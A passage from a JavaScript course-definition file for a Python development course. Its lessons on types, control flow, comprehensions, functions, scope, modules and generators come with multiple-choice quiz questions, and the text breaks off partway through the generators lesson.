import { course, chapter, lesson, q } from '../authoring.js';

export default course({
  slug: 'python-development',
  title: 'Python Development',
  category: 'Programming',
  level: 'Beginner → Intermediate',
  duration: '8 weeks',
  accent: 'emerald',
  coverKey: 'python-development',
  summary:
    'Learn Python the way it is actually written — types and comprehensions, classes and dunder methods, packaging, real HTTP clients, and a test suite that proves the whole thing works.',
  description:
    'You write Python the way working developers do: functions and classes that are easy to test, files and JSON handled without data loss, and errors that surface instead of hiding. By the end you are calling live HTTP APIs, organising code into packages and virtualenvs, and covering it with pytest.',
  chapters: [
    chapter(
      'Python Fundamentals',
      'Values and types, control flow that reads like English, and the comprehensions Python leans on everywhere.',
      [
        lesson('Values, Names, and Types', 13, `
Python has no variable declarations. A name is a label you stick onto a value, and the **value** carries the type — not the name.

\`\`\`python
x = 5
print(type(x))    # <class 'int'>
x = "five"        # perfectly legal; the name now labels a str
print(type(x))    # <class 'str'>
\`\`\`

### The types you will use every day

| Type | Example | Mutable? |
|---|---|---|
| \`int\` | \`42\`, \`-7\` | no |
| \`float\` | \`3.14\` | no |
| \`str\` | \`"hello"\` | no |
| \`bool\` | \`True\`, \`False\` | no |
| \`NoneType\` | \`None\` | no |
| \`list\` | \`[1, 2, 3]\` | **yes** |
| \`dict\` | \`{"a": 1}\` | **yes** |
| \`set\` | \`{1, 2}\` | **yes** |
| \`tuple\` | \`(1, 2)\` | no |

### Mutable vs immutable is the distinction everything rests on

\`\`\`python
a = [1, 2]
b = a          # not a copy — a second label on the same list object
b.append(3)
print(a)       # [1, 2, 3]

n = 5
m = n
m += 1
print(n)       # 5 — ints are immutable, so m += 1 built a brand new int
\`\`\`

Assignment **never** copies. If you want a copy, ask for one: \`b = a.copy()\` or \`b = list(a)\`. This one fact explains most "why did my data change?" bugs, and it comes back in Chapter 3 when a mutable class attribute leaks between instances.

Note that \`.copy()\` is *shallow* — a nested list inside is still shared. Use \`copy.deepcopy(a)\` when the nesting matters.

### Numbers behave arithmetically, not intuitively

\`\`\`python
7 / 2      # 3.5   — true division, always a float
7 // 2     # 3     — floor division
-7 // 2    # -4    — floors toward negative infinity; it does not truncate
7 % 2      # 1
2 ** 10    # 1024

0.1 + 0.2 == 0.3     # False
\`\`\`

Floats are binary approximations of decimal numbers, so \`0.1 + 0.2\` is \`0.30000000000000004\`. Compare with a tolerance, and never store money in a float:

\`\`\`python
import math
math.isclose(0.1 + 0.2, 0.3)         # True

from decimal import Decimal
Decimal("0.1") + Decimal("0.2")      # Decimal('0.3') — exact
\`\`\`

### Strings and f-strings

\`\`\`python
name, price = "Ada", 12.5
f"{name} owes {price:.2f}"       # 'Ada owes 12.50'
f"{price=}"                      # 'price=12.5' — excellent for debugging
"a,b,c".split(",")               # ['a', 'b', 'c']
", ".join(["a", "b"])            # 'a, b'
"  padded  ".strip()             # 'padded'
\`\`\`

Strings are immutable: \`s.upper()\` returns a new string and leaves \`s\` alone. Building a large string with \`s += piece\` inside a loop is quadratic — collect the pieces in a list and \`"".join(pieces)\` once at the end.

### \`is\` is not \`==\`

\`==\` asks "same value". \`is\` asks "the same object in memory".

\`\`\`python
a = [1, 2]
b = [1, 2]
a == b     # True
a is b     # False
\`\`\`

Small integers and short strings are cached by the interpreter, so \`if x is 5\` *appears* to work — and then fails in production the day the value exceeds 256. Use \`is\` only for \`None\`, \`True\`, and \`False\`; use \`==\` for everything else.

### Type hints

\`\`\`python
def total(prices: list[float], tax: float = 0.0) -> float:
    return sum(prices) * (1 + tax)
\`\`\`

Python does not enforce hints at runtime — they exist for readers, editors, and \`mypy\`. On any function someone else will call, they pay for themselves the first time an editor autocompletes the argument correctly.
        `,
        [
          q('A billing script computes -7 // 2 and the author expects -3. What does Python produce?', [
            '-4, because // floors toward negative infinity',
            '-3, because // truncates the fraction away',
            '-3.5, because // returns a float once a value is negative',
            '-3, because the sign is applied after the division',
          ], 0, 'Floor division rounds down to the next lower integer, and for a negative result lower means further from zero, so -7 // 2 is -4 rather than -3.'),
          q('You build one string from 50,000 log lines with text += line inside a loop and it crawls. What fixes it?', [
            'Convert each line to bytes before adding it on',
            'Write text = text + line so no new object is built',
            'Collect the lines in a list and join them once at the end',
            'Preallocate text with spaces to the final length first',
          ], 2, 'Strings are immutable, so every += copies the whole accumulated string and the loop becomes quadratic, while join builds the result in a single pass.'),
          q('A test asserting 0.1 + 0.2 == 0.3 fails on a cart total. Which response is correct?', [
            'Round both sides to two places inside the equality test',
            'Compare with math.isclose, and hold money as Decimal',
            'Cast both sides back to float before comparing them',
            'Use is instead of ==, so identity is checked properly',
          ], 1, 'Floats are binary approximations of decimal values, so arithmetic wants a tolerance and money wants Decimal, which stores the decimal value exactly.'),
        ]
      ),
        lesson('Control Flow That Reads Like English', 12, `
Python replaces braces with **indentation**. That indentation is not a style preference, it is syntax — the block *is* the indented region. Four spaces, never tabs, and let your editor enforce it.

### Conditionals

\`\`\`python
score = 74

if score >= 90:
    grade = "A"
elif score >= 70:
    grade = "B"
else:
    grade = "C"

status = "pass" if score >= 50 else "fail"    # conditional expression
\`\`\`

Comparisons chain the way maths does: \`if 0 <= score <= 100:\` is one expression, not two joined by \`and\`.

### Truthiness

Falsy values in full: \`False\`, \`None\`, \`0\`, \`0.0\`, \`""\`, \`[]\`, \`{}\`, \`set()\`, \`()\`. Everything else is truthy.

\`\`\`python
if items:              # idiomatic "not empty"
if len(items) > 0:     # correct, but noisy
\`\`\`

The trap is that truthiness collapses "empty" and "missing":

\`\`\`python
def page_size(value):
    return value or 20                        # 0 silently becomes 20 — a bug

def page_size(value):
    return 20 if value is None else value     # says what you meant
\`\`\`

Test for absence with \`is None\`, never with \`if not x\`. \`0\`, \`""\`, and \`[]\` are all perfectly good values that would take the same branch.

### Loops iterate over things, not indexes

\`\`\`python
for course in courses:
    print(course)
\`\`\`

The classic mistake in Python written by C or Java transplants:

\`\`\`python
for i in range(len(courses)):     # avoid
    print(courses[i])
\`\`\`

If you need the position, ask for it. If you need two sequences at once, zip them:

\`\`\`python
for i, course in enumerate(courses, start=1):
    print(i, course)

for name, hours in zip(names, hour_list):
    print(name, hours)
\`\`\`

\`zip\` stops at the shortest input — **silently**. Pass \`strict=True\` (Python 3.10+) when equal lengths are an invariant and you get a loud \`ValueError\` instead of quietly dropped rows.

### while, break, and the loop \`else\`

\`\`\`python
attempts = 0
while attempts < 3:
    if try_login():
        break
    attempts += 1
else:
    lock_account()      # runs only if the loop finished without break
\`\`\`

That \`else\` on a loop is unusual and worth learning: it fires when the loop completes *without* \`break\`. It removes the \`found = False\` flag variable that otherwise clutters every search loop.

### Never mutate a list you are iterating

\`\`\`python
for c in courses:
    if c.expired:
        courses.remove(c)     # skips elements
\`\`\`

Removing an item shifts every later element back one place while the loop counter moves forward, so you skip roughly every second match. The symptom is "it only deletes half of them". Build a new list instead:

\`\`\`python
courses = [c for c in courses if not c.expired]
\`\`\`

### \`match\` for shape-based dispatch (3.10+)

\`\`\`python
match event:
    case {"type": "enrol", "course": course}:
        enrol(course)
    case {"type": "cancel"}:
        cancel()
    case _:
        raise ValueError(f"unknown event: {event}")
\`\`\`

\`match\` destructures while it compares, which makes it genuinely better than an \`if\` chain for parsing JSON-shaped data (Chapter 4). For plain equality, an \`if/elif\` or a dictionary lookup is still clearer:

\`\`\`python
handlers = {"enrol": enrol, "cancel": cancel}
handler = handlers.get(event["type"])
if handler is None:
    raise ValueError(f"unknown event: {event}")
handler(event)
\`\`\`

A dispatch dictionary scales; a twelve-branch \`elif\` chain does not.
        `,
        [
          q('def page_size(value): return value or 20. A caller passes 0 deliberately. What comes back?', [
            '0, because the caller supplied a value explicitly',
            'A TypeError, because or wants two boolean operands',
            '20, but only on the first call in the process',
            '20, because 0 is falsy and or skips straight past it',
          ], 3, 'The or operator tests truthiness, and 0 is falsy alongside None, empty string and empty list, so a legitimate 0 is silently replaced by the fallback.'),
          q('Deleting expired items with for c in courses: courses.remove(c) removes only about half of them. Why?', [
            'remove deletes by value, so duplicate entries are skipped',
            'Each removal shifts later items back while the loop moves forward',
            'The loop caches the list contents before the first iteration',
            'remove fails silently once the list has shrunk by one',
          ], 1, 'The iterator walks the list by position, so removing an item pulls the next one into the slot just visited and the loop steps straight over it.'),
          q('You zip 1,000 names with 998 hour values and nothing is reported. What did zip do?', [
            'Stopped at the shorter input and dropped two rows silently',
            'Padded the two missing values with None automatically',
            'Raised a ValueError that the surrounding code hid',
            'Repeated the final hours value for the last two names',
          ], 0, 'zip stops as soon as any input is exhausted and reports nothing, which is why strict=True exists to turn a length mismatch into a loud ValueError.'),
        ]
      ),
        lesson('Comprehensions and Choosing a Container', 14, `
A comprehension builds a new collection from an existing iterable in a single expression. Idiomatic Python leans on them constantly, so reading them fluently matters as much as writing them.

### The shape

\`\`\`python
squares = [n * n for n in range(10)]
evens   = [n for n in range(20) if n % 2 == 0]
titles  = [c["title"].upper() for c in courses if c["level"] == "beginner"]
\`\`\`

Read it as the loop it replaces:

\`\`\`python
titles = []
for c in courses:
    if c["level"] == "beginner":
        titles.append(c["title"].upper())
\`\`\`

Same result in four lines instead of one — and the loop version quietly invites you to add unrelated work inside it.

### Dicts and sets too

\`\`\`python
by_slug = {c["slug"]: c for c in courses}     # dict comprehension
levels  = {c["level"] for c in courses}       # set comprehension — deduplicates
\`\`\`

Building a lookup dict like \`by_slug\` is the highest-value comprehension in ordinary code: it turns a linear scan on every lookup into one pass plus constant-time lookups forever after.

### Generators: same syntax, no list

Round brackets produce a **generator** — values computed one at a time, nothing stored:

\`\`\`python
total   = sum(n * n for n in range(1_000_000))    # constant memory
squares = [n * n for n in range(1_000_000)]       # tens of MB you then discard
\`\`\`

Use a generator when you consume the values once. Use a list when you need to index it, measure it, or iterate more than once — **a generator is exhausted after one pass**, and a second \`for\` over it yields nothing at all, with no error. That silent-empty-second-loop is a genuinely confusing bug.

### When not to use one

A comprehension is for *building a collection*. If the body exists for its side effects, write a loop:

\`\`\`python
[send_email(u) for u in users]    # builds a list of Nones nobody wants
for u in users:                   # say what you mean
    send_email(u)
\`\`\`

Two \`for\` clauses plus a condition is usually past the readability limit. Split it.

### Choosing a container

| Need | Use | Why |
|---|---|---|
| Ordered sequence you will change | \`list\` | cheap append and index |
| Fixed record, usable as a dict key | \`tuple\` | immutable, therefore hashable |
| Membership tests, deduplication | \`set\` | \`x in s\` is O(1) |
| Lookup by key | \`dict\` | O(1), insertion-ordered since 3.7 |

The classic performance bug is a membership test against a list inside a loop:

\`\`\`python
enrolled = [...]                  # 50,000 ids in a list
for student in students:          # 10,000 students
    if student.id in enrolled:    # scans up to 50,000 items each time
        ...

enrolled = set(enrolled)          # one line — the loop is now effectively instant
\`\`\`

Five hundred million comparisons become ten thousand hash lookups. Nothing else in the loop changed.

### Slicing and sorting

\`\`\`python
items[0]     items[-1]                        # first, last
items[:3]    items[3:]   items[::2]   items[::-1]
\`\`\`

Slicing a list always returns a **new list**, so \`copy = items[:]\` is a shallow copy and \`items[::-1]\` is a reversed copy.

\`\`\`python
sorted(courses, key=lambda c: c["hours"])                  # returns a new list
sorted(courses, key=lambda c: (-c["hours"], c["title"]))   # hours desc, then title
courses.sort(key=lambda c: c["hours"])                     # in place, returns None
\`\`\`

Writing \`courses = courses.sort(...)\` sets \`courses\` to \`None\`. \`.sort()\` mutates and returns nothing; \`sorted()\` leaves the original alone and returns the new list. Confusing the two is a rite of passage — recognise the symptom (\`TypeError: 'NoneType' object is not iterable\` two lines later) and you will only lose a minute to it.
        `,
        [
          q('After courses = courses.sort(key=len), the next line raises TypeError: \'NoneType\' object is not iterable. Why?', [
            'sort needs a reverse argument before it returns anything',
            'sort() sorts in place and returns None, so courses is now None',
            'key=len cannot be applied to a list of dictionaries',
            'Sorting requires sorted to be imported from the operator module',
          ], 1, 'list.sort mutates the list and returns None, so assigning its result throws the sorted list away; sorted() is the one that hands back a new list.'),
          q('Why does building by_slug = {c["slug"]: c for c in courses} pay off on a page that looks courses up repeatedly?', [
            'It sorts the courses by slug as a useful side effect',
            'Dict comprehensions run in C, so they beat any explicit loop',
            'It removes courses that happen to share a title',
            'One pass builds it, and every later lookup is constant time',
          ], 3, 'The comprehension costs a single linear pass and turns every later lookup from a scan of the whole list into one hash lookup by key.'),
          q('rows = (parse(l) for l in lines). You loop over rows twice and the second loop body never runs. Why?', [
            'The generator raised StopIteration that the first loop absorbed',
            'A generator must be passed to list() before any iteration',
            'The first pass consumed it, and a generator cannot be restarted',
            'The second loop is missing the condition the first one had',
          ], 2, 'A generator produces each value once and is exhausted afterwards, so a second iteration finds nothing and raises nothing, which makes the bug hard to spot.'),
        ]
      ),
            lesson('Unpacking and Multiple Assignment', 13, `
A nightly import died at 02:00 with \`ValueError: too many values to unpack (expected 3)\`. Nobody had touched the script in months. The upstream team had added a \`created_at\` column to the export, and this one line stopped working:

\`\`\`python
slug, title, hours = row      # row now arrives with four fields
\`\`\`

Unpacking is a feature you use hundreds of times a day, so its failure modes are worth knowing cold.

### Both sides at once

The right-hand side is evaluated completely, packed into a tuple, and only then bound to the names on the left.

\`\`\`python
name, hours = "Python Development", 24
a, b = b, a                              # a real swap, no temp variable
counts[i], counts[j] = counts[j], counts[i]
\`\`\`

That ordering is the whole trick. Both old values are already sitting in a tuple before any name on the left is rebound, so nothing gets clobbered halfway through.

### Starred targets absorb the rest

\`\`\`python
first, *rest = ["intro", "loops", "files", "tests"]
first          # 'intro'
rest           # ['loops', 'files', 'tests']

*body, last = lines            # everything except the final line
head, *_, tail = row           # keep the ends, discard the middle
\`\`\`

A starred name always binds a **list**, even when it collects nothing: \`first, *rest = ["intro"]\` leaves \`rest\` as \`[]\`, not \`None\`. Only one star is allowed per assignment, because two would be ambiguous.

That is also the fix for the broken import:

\`\`\`python
slug, title, hours, *extra = row      # survives new columns
\`\`\`

### Unpacking in loops

\`\`\`python
for slug, hours in [("python-development", 24), ("frontend-engineering", 30)]:
    print(slug, hours)

for i, (slug, hours) in enumerate(pairs, start=1):
    print(i, slug, hours)

for key, value in config.items():
    print(key, value)
\`\`\`

Brackets on the left mirror the shape of the data. If a row arrives as \`("ada", (51.5, -0.1))\`, then \`name, (lat, lon) = row\` pulls all three values out in one line.

### The same stars at a call site

\`\`\`python
point = (51.5, -0.1)
plot(*point)                        # plot(51.5, -0.1)

defaults = {"timeout": 5, "retries": 3}
fetch(url, **defaults)              # fetch(url, timeout=5, retries=3)
\`\`\`

And inside literals, which is the cleanest way to merge:

\`\`\`python
merged = [*base_tags, *extra_tags]
config = {**defaults, **overrides}       # later keys win
config = defaults | overrides            # identical result, Python 3.9+
\`\`\`

\`zip(*rows)\` transposes a table, because it spreads every row in as a separate argument:

\`\`\`python
rows = [(1, "a"), (2, "b"), (3, "c")]
nums, letters = zip(*rows)          # (1, 2, 3) and ('a', 'b', 'c')
\`\`\`

### Three forms that catch people

| Written | Result |
|---|---|
| \`x = 5,\` | the tuple \`(5,)\`, not the int \`5\` |
| \`x, = [5]\` | the int \`5\`, unpacked out of a one-item list |
| \`a, b = "hi"\` | \`'h'\` and \`'i'\`, because a string is iterable |

The last one is the quiet one. Unpacking works on any iterable, so a function that returns the string \`"ok"\` where you expected a pair still assigns two names without complaint, and the damage surfaces later as a comparison that never matches.

When the length is not guaranteed by the data, do not unpack blindly. Check \`len(row)\` first, or take a starred target and validate what landed in it:

\`\`\`python
slug, title, *rest = row
if len(rest) != 2:
    raise ValueError(f"unexpected column count in {row!r}")
\`\`\`

Two names for a two-item row is a contract. Write it down where it breaks loudly, not three functions later.
      `,
        [
          q('A CSV row is unpacked with slug, title, hours = row and breaks when a column is added. Which line survives that?', [
            'slug, title, hours, *extra = row',
            'slug, title, hours = *row',
            'slug, title, hours = row[3]',
            'slug, title, hours = tuple(row)',
          ], 0, 'A starred target absorbs any number of leftover items, so the assignment keeps working when the exporter adds columns at the end.'),
          q('Why does a, b = b, a swap two names correctly without any temporary variable?', [
            'Python detects the swap pattern and rewrites the statement',
            'Names on the left are bound before the right side is read',
            'The whole right side becomes a tuple first, then it is unpacked',
            'b and a are copies here, so the order of binding cannot matter',
          ], 2, 'The right-hand side is evaluated into a tuple before any name on the left is rebound, so neither value is overwritten while the other still needs it.'),
          q('first, *rest = ["intro"] runs without error. What is rest bound to afterwards?', [
            'None, because there was nothing left to bind to it',
            'The string \'intro\', the same value that first got',
            'Nothing, since the statement raises a ValueError instead',
            'An empty list, because a starred name collects zero or more',
          ], 3, 'A starred target always binds a list and is perfectly happy collecting zero items, so rest is an empty list rather than None.'),
        ]
      ),
      ],
      [
        q('a = [1, 2]; b = a; b.append(3) — what is a now?', [
          '[1, 2]',
          '[1, 2, 3]',
          'A TypeError, because a is still in use',
          'A separate copy containing [1, 2]',
        ], 1, 'Assignment binds a second name to the same list object; it never copies, so both names see the append.'),
        q('Which check correctly tests that a value was not supplied?', [
          'if x == None:',
          'if x is None:',
          'if not x:',
          'if x != False:',
        ], 1, '"is None" tests identity and cannot be fooled by a custom __eq__, and unlike "not x" it does not also match 0, "" and [].'),
        q('You test membership 100,000 times against a collection of 50,000 ids. Which container?', [
          'list', 'tuple', 'set', 'str',
        ], 2, 'Sets hash their contents, so "x in s" is O(1); a list or tuple scans element by element.'),
        q('What is the difference between [n*n for n in nums] and (n*n for n in nums)?', [
          'None — the brackets are interchangeable',
          'The second is a tuple comprehension',
          'The second is a generator that yields lazily and can only be consumed once',
          'The second is evaluated at import time',
        ], 2, 'Round brackets build a generator: constant memory, produced on demand, and exhausted after a single pass.'),
      ]
    ),
    chapter(
      'Functions, Scope, and Modules',
      'Interfaces other people can call, the scoping rules behind the classic bugs, and how to organise and isolate a project.',
      [
        lesson('Functions, Arguments, and Defaults', 13, `
A function is the unit of reuse and the unit of testing. Get its interface right and the rest of the code arranges itself around it.

\`\`\`python
def enrol(student_id: int, course: str, notify: bool = True) -> dict:
    """Register a student and return the created record."""
    record = {"student": student_id, "course": course}
    if notify:
        send_email(student_id, course)
    return record
\`\`\`

The docstring is the first statement in the body, in triple quotes, and is what \`help(enrol)\` prints.

### Positional, keyword, and defaults

\`\`\`python
enrol(7, "python-development")                     # positional
enrol(course="python-development", student_id=7)   # keyword — order free
enrol(7, "python-development", notify=False)
\`\`\`

Defaults are evaluated **once, when the \`def\` statement runs** — not on each call. Which leads directly to:

### The mutable default argument — the most common bug in real Python codebases

\`\`\`python
def add_item(item, basket=[]):     # WRONG
    basket.append(item)
    return basket

add_item("a")      # ['a']
add_item("b")      # ['a', 'b']  — the same list, still holding last call's data
\`\`\`

That empty list was created once, at import time, and every call that omits \`basket\` shares it. It survives across requests, across users, and across tests — which is why the bug usually shows up as "the second test fails but passes on its own". Fix it with the sentinel pattern:

\`\`\`python
def add_item(item, basket=None):
    if basket is None:
        basket = []
    basket.append(item)
    return basket
\`\`\`

The same applies to \`{}\`, \`set()\`, and anything computed: \`def log(at=datetime.now())\` freezes the timestamp at import and every log line claims the process start time.

### \`*args\` and \`**kwargs\`

\`\`\`python
def total(*prices, **options):
    ...
total(10, 20, 30, currency="PKR")     # prices=(10,20,30)  options={'currency':'PKR'}
\`\`\`

Use them for wrappers that forward arguments (decorators, in the next lesson), not as a way to avoid naming parameters. \`**kwargs\` on a public function hides the interface from every reader, every editor, and every type checker.

### Keyword-only parameters

\`\`\`python
def resize(image, *, width, height):     # everything after * must be named
    ...

resize(img, width=800, height=600)       # required form
resize(img, 800, 600)                    # TypeError
\`\`\`

A bare \`*\` is the cheapest readability upgrade in the language. \`resize(img, 800, 600)\` read three files away is a guess; \`width=800\` never is. Apply it to any boolean parameter especially — \`send(msg, True)\` tells the reader nothing.

### Return values, not prints

\`\`\`python
def format_report(rows):        # testable, composable
    return "\\n".join(str(r) for r in rows)

def format_report(rows):        # untestable — the value is gone
    print("\\n".join(str(r) for r in rows))
\`\`\`

A function that prints can be used exactly one way. Return the value and let the caller decide whether to print it, log it, or send it over HTTP. Every test you write in Chapter 5 depends on this habit.

### Returning more than one value

\`\`\`python
def parse(line):
    return name, hours          # a tuple

name, hours = parse(line)       # unpacked at the call site
\`\`\`

Fine for two closely related values. Past three, return a \`dict\` or a dataclass (Chapter 3) — positional tuples break silently the day someone inserts a field in the middle, because nothing raises, the values just shift.

### Keep the logic pure

A function that takes arguments and returns a result, touching no globals and no disk, is trivial to test and impossible to break from a distance. Push file and network I/O to the edges of your program and keep the decision-making in the middle pure. That single habit is what makes a codebase testable at all.
        `,
        [
          q('def log(msg, at=datetime.now()) ships, and every log line carries the same timestamp. Why?', [
            'datetime.now() is cached by the interpreter for an hour',
            'Keyword defaults are shared by every function in a module',
            'now() returns the process start time unless given a timezone',
            'The default was evaluated once, when the def statement ran',
          ], 3, 'Default expressions are evaluated a single time at definition, so the timestamp is frozen at import and never recomputed on any later call.'),
          q('What does the bare star in def resize(image, *, width, height) enforce on callers?', [
            'width and height must be passed by name, not by position',
            'image may be omitted whenever width and height are given',
            'width and height are collected into a single tuple argument',
            'The function will accept any number of extra arguments',
          ], 0, 'Everything after a bare star is keyword-only, so resize(img, 800, 600) raises TypeError and every call site has to name what those numbers mean.'),
          q('format_report prints its string instead of returning it. What is the real cost of that?', [
            'It runs slower, because standard output is line buffered',
            'The value is gone, so nothing can test it or reuse it',
            'print cannot handle newline characters inside a report',
            'Callers have to wrap the call in try/except to capture it',
          ], 1, 'A function that prints hands its result to exactly one destination and leaves nothing for a test to assert on or a caller to send somewhere else.'),
        ]
      ),
        lesson('Scope, Closures, and Decorators', 12, `
Python resolves a name by searching four scopes in order — **L**ocal, **E**nclosing, **G**lobal, **B**uilt-in. First match wins.

\`\`\`python
count = 0                # global

def outer():
    count = 1            # enclosing, relative to inner
    def inner():
        print(count)     # finds the enclosing 1, not the global 0
    inner()
\`\`\`

### Reading is easy; assigning creates a local

\`\`\`python
total = 0

def add(n):
    total = total + n     # UnboundLocalError: cannot access local variable
                          # 'total' where it is not associated with a value
\`\`\`

Assigning to \`total\` *anywhere* in the function makes it local **for the entire function**, including the read on the right-hand side — which executes before anything has been assigned. The error is baffling precisely because the global is obviously right there.

Two escape hatches:

\`\`\`python
def add(n):
    global total          # rebind the module-level name
    total += n

def counter():
    n = 0
    def tick():
        nonlocal n        # rebind the enclosing function's name
        n += 1
        return n
    return tick
\`\`\`

Reach for \`nonlocal\` occasionally; reach for \`global\` almost never. A function that rebinds module state behaves differently depending on what ran before it — which is exactly the property that makes tests flaky.

Note that you can always *mutate* without any declaration: \`CACHE[key] = value\` needs no \`global\`, because you are not rebinding \`CACHE\`, only changing the object it points at.

### Closures

\`tick\` above is a **closure**: it keeps access to \`n\` from the scope it was defined in, long after \`counter()\` returned.

\`\`\`python
c = counter()
c(); c(); c()      # 1, 2, 3
\`\`\`

### Late binding — the classic closure bug

\`\`\`python
funcs = [lambda: i for i in range(3)]
[f() for f in funcs]        # [2, 2, 2] — not [0, 1, 2]
\`\`\`

Each lambda captured the *variable* \`i\`, not its value at the moment of creation. By the time you call them the loop has finished and \`i\` is 2. Bind the value explicitly with a default argument, which (per the previous lesson) is evaluated immediately:

\`\`\`python
funcs = [lambda i=i: i for i in range(3)]
[f() for f in funcs]        # [0, 1, 2]
\`\`\`

This bites hardest with event handlers and callbacks registered inside a loop — every button ends up doing whatever the last one was supposed to do.

### Functions are values

\`\`\`python
sorted(courses, key=len)
handlers = {"enrol": enrol, "cancel": cancel}
\`\`\`

\`lambda\` is for one short expression passed inline. The moment it needs a name, a statement, or a comment, use \`def\`.

### Decorators

A decorator is a function that takes a function and returns a replacement:

\`\`\`python
import functools, time

def timed(fn):
    @functools.wraps(fn)                 # preserves __name__ and __doc__
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        try:
            return fn(*args, **kwargs)
        finally:
            print(f"{fn.__name__} took {time.perf_counter() - start:.3f}s")
    return wrapper

@timed
def load_courses():
    ...
\`\`\`

\`@timed\` is exactly \`load_courses = timed(load_courses)\`, nothing more. Omit \`functools.wraps\` and every decorated function reports its name as \`wrapper\`, which quietly breaks introspection, generated documentation, and some frameworks' route registration.

Worth knowing from the standard library: \`functools.lru_cache\` to memoise a pure function, \`functools.cached_property\`, and \`dataclasses.dataclass\` (Chapter 3).
        `,
        [
          q('You write a decorator and forget the @functools.wraps(fn) line. What actually breaks?', [
            'The wrapped function stops accepting keyword arguments',
            'The decorator body runs twice on every single call',
            'Every decorated function now reports its name as wrapper',
            'Return values are silently converted into None objects',
          ], 2, 'Without wraps the replacement function keeps its own __name__ and __doc__, which breaks introspection, generated documentation, and frameworks that register routes by name.'),
          q('handlers = [lambda: i for i in range(3)], then calling each one returns 2, 2, 2. Why?', [
            'range is exhausted once the comprehension has finished',
            'Each lambda copied i, but the copy was later overwritten',
            'A comprehension evaluates its body only on the final pass',
            'The lambdas closed over the variable i, not its value then',
          ], 3, 'A closure keeps a reference to the variable itself rather than a snapshot, so every lambda reads i after the loop finished and left it at 2.'),
          q('Inside a function, CACHE[key] = value works with no global statement but CACHE = {} raises. Why?', [
            'Dictionary writes are exempt from the normal scope rules',
            'Assigning to CACHE makes it local, while mutating it does not',
            'global is only needed for names defined in another module',
            'Subscript assignment is resolved once, at import time',
          ], 1, 'Only rebinding a name creates a local variable; item assignment mutates the object that the module-level name already points at, so no declaration is needed.'),
        ]
      ),
        lesson('Modules, Packages, and Virtual Environments', 13, `
A **module** is a \`.py\` file. A **package** is a directory of modules. Both are imported the same way, and both execute exactly once per process, on first import.

### Import forms

\`\`\`python
import json                          # json.dumps(...)
import numpy as np                   # aliased
from pathlib import Path             # pull one name into your namespace
from myapp.services import enrol     # from a package
\`\`\`

Avoid \`from module import *\`. It dumps unknown names into your namespace, can silently shadow your own, and leaves no reader (or editor) able to answer "where did \`parse\` come from?".

### The \`__main__\` guard

\`\`\`python
# report.py
def build_report(rows):
    ...

if __name__ == "__main__":
    print(build_report(load_rows()))
\`\`\`

When you run \`python report.py\`, \`__name__\` is \`"__main__"\`. When someone imports \`report\`, it is \`"report"\`. Without the guard, *importing* the module runs the script — which is how an innocent \`from report import build_report\` ends up printing a report, or writing to a database, as a side effect of the import. Every file that is both importable and runnable needs it.

### Packages

\`\`\`text
myapp/
  __init__.py
  main.py
  services/
    __init__.py
    enrolment.py
\`\`\`

\`\`\`python
from myapp.services.enrolment import enrol     # absolute — prefer this
from .enrolment import enrol                   # relative, only inside the package
\`\`\`

Run packaged code as a module — \`python -m myapp.main\` — not \`python myapp/main.py\`. The second form puts \`myapp/\` on \`sys.path\` instead of the project root, so every absolute import in the package breaks with \`ModuleNotFoundError: No module named 'myapp'\`.

### The shadowing trap

Name a file \`json.py\`, \`random.py\`, or \`email.py\` in your project directory and \`import json\` finds **your** file, because the script's own directory comes before the standard library on \`sys.path\`. The resulting \`AttributeError: module 'json' has no attribute 'dumps'\` points nowhere near the cause. Never name a file after a module you import — and delete the stale \`__pycache__\` directory after you rename it.

### Circular imports

\`a.py\` imports \`b\`, \`b\` imports \`a\`. The second import receives a half-initialised module and fails on a name that plainly exists in the file. Fix the design — extract the shared piece into a third module — rather than moving the import inside a function, which hides the coupling instead of removing it.

### Virtual environments

Project A needs \`requests\` 2.28; project B needs 2.31. Installed globally, one of them is broken. A **virtualenv** gives each project its own isolated \`site-packages\`.

\`\`\`bash
python -m venv .venv
source .venv/bin/activate          # Windows: .venv\\Scripts\\activate
python -m pip install requests pytest
python -m pip freeze > requirements.txt
deactivate
\`\`\`

Add \`.venv/\` to \`.gitignore\`. You commit the *list* of dependencies, never the packages themselves.

\`\`\`bash
# on another machine, or in CI
python -m venv .venv && source .venv/bin/activate
python -m pip install -r requirements.txt
\`\`\`

Use \`python -m pip install ...\` rather than a bare \`pip\`. It guarantees you are installing into the interpreter you are about to run, which is the fix for most of the "I installed it but Python says ModuleNotFoundError" reports you will ever field.

For anything you publish, declare dependencies in \`pyproject.toml\` and pin exact versions in a lock file. \`requirements.txt\` from \`pip freeze\` is the lightweight version of the same idea, and it is enough for an application.
        `,
        [
          q('A colleague adds random.py to the project root and unrelated code starts failing with AttributeError. What happened?', [
            'The stale __pycache__ folder has to be cleared before any import',
            'Two modules are not allowed to share a name inside one package',
            'import random now finds their file, because the script directory comes before the standard library on sys.path',
            'random.py needs an __init__.py beside it before it can be imported',
          ], 2, 'sys.path begins with the running script\'s own directory, so a local file shadows the standard library module of the same name for every import in the process.'),
          q('python myapp/main.py raises ModuleNotFoundError: No module named \'myapp\'. What fixes it?', [
            'Run python -m myapp.main from the project root instead',
            'Add myapp to requirements.txt and reinstall the environment',
            'Rename __init__.py to __main__.py inside the myapp package',
            'Switch the absolute imports in the package to relative ones',
          ], 0, 'Running the file directly puts myapp/ itself on sys.path rather than the project root, while -m runs it as a module with the root importable.'),
          q('Why install with python -m pip install requests rather than a bare pip install?', [
            'A bare pip cannot read a requirements.txt file at all',
            'The -m form skips the virtualenv and installs system wide',
            'Only -m enables the resolver that handles version conflicts',
            'It installs into the exact interpreter you are about to run',
          ], 3, 'A bare pip on the path may belong to a different interpreter, which is the usual cause of installing a package and still getting ModuleNotFoundError.'),
        ]
      ),
            lesson('Generators and the yield Statement', 13, `
A log analyser read a 4.2 GB nginx access file with \`f.read().splitlines()\`, which needed roughly 9 GB of RAM once every line became its own \`str\` object. The container had 2 GB. It was killed nightly at 03:00, and the fix was one keyword: \`return\` became \`yield\`.

### A function that pauses

\`\`\`python
def parsed_lines(path):
    with open(path, encoding="utf-8") as f:
        for line in f:
            yield parse(line)
\`\`\`

Any function containing \`yield\` is a generator function. Calling it runs **none** of the body:

\`\`\`python
rows = parsed_lines("access.log")   # the file is not even open yet
next(rows)                          # now it opens and produces one record
\`\`\`

Each \`next()\` runs the body until it reaches a \`yield\`, hands that value out, and freezes the function exactly there with its local variables intact. The following \`next()\` resumes on the next line. Memory stays flat regardless of file size.

### Pipelines

